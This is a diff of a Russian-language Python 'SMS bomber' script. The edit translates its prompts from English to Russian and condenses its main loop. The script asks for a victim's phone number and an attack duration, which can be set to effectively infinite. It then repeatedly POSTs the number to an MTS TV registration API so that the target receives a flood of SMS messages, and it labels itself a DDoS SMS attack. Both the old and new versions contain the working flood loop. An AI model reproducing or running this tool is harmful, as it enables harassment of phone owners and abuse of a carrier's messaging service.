@@ -54,24 +54,24 @@ message8 = """    \n Разработчики:
 
 print(Fore.GREEN)
 time.sleep(1)
-E = input("\n || МТС Версия || \n Хотите попасть в настройки? [1 - Yes | \033[31m2 - No\033[0m\033[32m] > \033[94m")
+E = input("\n --][ МТС Версия ][-- \n\n Хотите попасть в настройки? (1 - Да | \033[31m2 - Нет\033[0m\033[32m) > \033[94m")
 if E == str(1):
     print(Fore.GREEN)
-    print("\n          [SETTINGS] ")
-    print("\n \033[94m[0] Developers \033[0m                             ")
-    print("\n \033[32m[1] Banner display time (sec)\033[0m  ")
-    print("\n \033[32m[2] Exit\033[0m ")
+    print("\n          [НАСТРОЙКИ] ")
+    print("\n \033[94m[0] Разработчики \033[0m                             ")
+    print("\n \033[32m[1] Время показа баннера (Сек)\033[0m  ")
+    print("\n \033[32m[2] Выход\033[0m ")
     time.sleep(2)
     print(Fore.GREEN)
-    p = input("\n [>>] ")
+    p = input("\n [>] ")
     
     if p == str(1):
-        kol2 =  input("\n Enter the time less than 20 seconds !>> ")
+        kol2 =  input("\n Введите время не более 20! > ")
         for char in message1:
             sys.stdout.write(char)
             sys.stdout.flush()
             time.sleep(0.01)
-        p = input("\n To leave out write (2) >> ")
+        p = input("\n Чтобы выйти введите (2) > ")
 
     if p == str(0):
         print(Fore.YELLOW)
@@ -80,7 +80,7 @@ if E == str(1):
             sys.stdout.flush()
             time.sleep(0.01)
         print(Fore.GREEN)
-        p = input("\n To leave out write (2) >> ")
+        p = input("\n Чтобы выйти введите (2) > ")
 
     if p == str(2):
         os.system("clear")
@@ -151,7 +151,7 @@ def banner_atack():
 
 
 R = 0
-message7 = "\033[94m \n To leave out press Ctrl + C ! \033[0m"
+message7 = "\033[94m \n Чтобы выйти из программы, нажмите Ctrl + C\033[0m"
 message5 = "\033[94m \n ЧТо бы вЫйти из прОграМмы нАжмиТе Ctrl + C иЛи на КРЕСТИК в пРавоМ верХнем угЛу. \033[0m"
 if oso == "posix":
     for char in message7:
@@ -166,8 +166,8 @@ else:
         time.sleep(0.01)
 
 print(Fore.RED)
-_phone = input('\n \033[31mEnter the number (Without +) > \033[0m\033[94m')
-message4 =  "Starting attacking || " + str(_phone)+ " || \033[94mDDOS SMS Attack (MTS Only)\033[0m \n"
+_phone = input('\n \033[31mВведите номер (Без +) > \033[0m\033[94m')
+message4 =  "Начинаем атаку на || " + str(_phone)+ " || \033[94mDDOS SMS Атака (Только МТС)\033[0m \n"
 
 if _phone[0] == '+':
 
@@ -181,12 +181,12 @@ if _phone[0] == '9':
 
     _phone = '7'+_phone
 
-kol = input("\n \033[31mTime of attacking (Enter more than 30 | 0 - infinite) > \033[0m\033[94m ")
+kol = input("\n \033[31mВремя атаки (Введите больше 30 | 0 - бесконечно) > \033[0m\033[94m ")
 if kol == str(0):
     kol = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 start_time = time.time() 
 CLOSE_AFTER = kol
-call = input("\n \033[31mType of attacking (1 - Call attack (NOT WORKING) | 2 - SMS Attack (MTS Only) ) > \033[0m\033[94m")
+call = input("\n \033[31mТип атаки (1 - Атака звонками (НЕ РАБОТАЕТ) | 2 - SMS Атака (Только МТС)) > \033[0m\033[94m")
 if call == str(1):
     os.system("clear")
 
@@ -249,119 +249,17 @@ if call == str(2):
     print(Fore.GREEN)
 
     while True:
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
+            print("Атака закончена! Нажмите ENTER для закрытия...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
-            print('[+] MTS sent! || BIG! count - ' + str(R))
-            time.sleep(5)
+            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
+            time.sleep(3)
         except:
-            print('[-] error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            time.sleep(0)
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || count - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press enter to close...")
-            break
-        try:
-            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-            R = R + 1
-            print('[+] MTS sent! || BIG! count - ' + str(R))
-            time.sleep(5)
-        except:
-            print('[-] error in sent!')
-
+            print('[-] Ошибка при отправке!')
 
     input()
 
